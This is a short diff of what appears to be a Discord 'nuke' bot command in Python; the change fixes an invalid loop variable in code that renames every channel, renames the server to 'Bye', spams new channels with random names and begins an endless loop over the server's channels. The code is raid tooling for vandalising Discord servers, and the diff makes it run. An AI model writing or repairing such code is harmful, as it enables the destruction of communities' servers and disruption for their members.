@@ -38,10 +38,10 @@ async def nuke (ctx):
             print (f"{channel.name} has been changed")
         except:
             print ("wasnt changed")
-    for 1 in range(1):
+    for i in range(1):
         await ctx.guild.edit("Bye")
         print ("name changed")
-    for 1 in range(1):
+    for i in range(1):
         await guild.create_text_channel(random.choice(channel_names))
     while True:
         for channel in guild.text_channels:
